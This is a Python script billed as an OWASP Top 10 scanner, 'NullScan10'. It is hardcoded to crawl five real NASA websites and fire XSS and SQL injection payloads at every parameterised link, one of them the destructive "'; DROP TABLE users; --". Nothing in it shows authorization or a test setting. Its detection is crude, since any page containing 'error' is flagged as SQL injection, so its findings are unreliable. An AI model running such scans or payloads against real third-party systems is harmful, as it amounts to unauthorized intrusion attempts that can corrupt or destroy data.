# NullScan10 - Advanced OWASP Top 10 Vulnerability Scanner
# Created by Mr. Axolotl (NulLNet)

import requests
import threading
import re
import os
from urllib.parse import urljoin, urlparse
from bs4 import BeautifulSoup

# Scanner configuration
targets = [
    "https://earthdata.nasa.gov",
    "https://data.nasa.gov",
    "https://api.nasa.gov",
    "https://mars.nasa.gov",
    "https://science.nasa.gov"
]

XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    "'\"><img src=x onerror=alert(1)>"
]

SQLI_PAYLOADS = [
    "' OR '1'='1",
    "'; DROP TABLE users; --"
]

results_dir = "reports"

def scan_xss(url, payloads):
    found = []
    for payload in payloads:
        test_url = url + payload
        try:
            r = requests.get(test_url, timeout=5)
            if payload in r.text:
                found.append((url, payload))
        except:
            continue
    return found

def scan_sqli(url, payloads):
    found = []
    for payload in payloads:
        test_url = url + payload
        try:
            r = requests.get(test_url, timeout=5)
            if "sql" in r.text.lower() or "error" in r.text.lower():
                found.append((url, payload))
        except:
            continue
    return found

def extract_links(base_url):
    try:
        r = requests.get(base_url, timeout=5)
        soup = BeautifulSoup(r.text, 'html.parser')
        return list(set([urljoin(base_url, a['href']) for a in soup.find_all('a', href=True)]))
    except:
        return []

def scan_target(target):
    print(f"[🔍] Scanning {target}")
    domain = urlparse(target).netloc
    os.makedirs(f"{results_dir}/{domain}", exist_ok=True)

    xss_found = []
    sqli_found = []
    links = extract_links(target)

    for link in links:
        if "=" in link:
            xss_found += scan_xss(link, XSS_PAYLOADS)
            sqli_found += scan_sqli(link, SQLI_PAYLOADS)

    with open(f"{results_dir}/{domain}/vulns.txt", "w") as f:
        if xss_found:
            f.write("[XSS Vulnerabilities]\n")
            for url, payload in xss_found:
                f.write(f"{url} [Payload: {payload}]\n")
        if sqli_found:
            f.write("\n[SQL Injection Vulnerabilities]\n")
            for url, payload in sqli_found:
                f.write(f"{url} [Payload: {payload}]\n")

    print(f"[✅] Scan completed for {domain}")
    if xss_found or sqli_found:
        print(f"[⚠️] Vulnerabilities Found in {domain}:")
        for vuln in xss_found + sqli_found:
            print(f"  - {vuln[0]} (Payload: {vuln[1]})")
    else:
        print(f"[✔️] No obvious vulns found in {domain}")

threads = []
for t in targets:
    thread = threading.Thread(target=scan_target, args=(t,))
    thread.start()
    threads.append(thread)

for thread in threads:
    thread.join()

print("\n[🔚] NullScan10 scan complete - Created by Mr. Axolotl")